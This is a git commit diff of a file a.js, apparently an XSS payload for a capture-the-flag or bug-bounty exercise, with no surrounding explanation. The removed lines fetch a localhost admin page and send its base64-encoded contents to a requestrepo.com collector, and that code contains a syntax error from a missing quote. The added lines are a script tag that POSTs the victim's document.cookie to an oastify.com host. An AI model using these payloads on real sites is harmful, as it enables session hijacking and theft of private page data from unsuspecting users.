52e11a36529e91f7eaea8e31f4c8a905d5a7d07e
Bao Khanh <khanhhnahk1905@gmail.com>
2023-08-30 16:06:51 +0700

    init1

--- a.js
+++ a.js
@@ -1,11 +1,7 @@
-
-var url = "http://localhost:1337/admin";
-var attacker = "http://qy7yegjk.requestrepo.com;
-var xhr  = new XMLHttpRequest();
-xhr.onreadystatechange = function() {
-    if (xhr.readyState == XMLHttpRequest.DONE) {
-        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
-    }
-}
-xhr.open('GET', url, true);
-xhr.send(null);
+<script>
+  fetch('http://67bvfk9h7y69h8n2vokkx2syfplg9axz.oastify.com', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
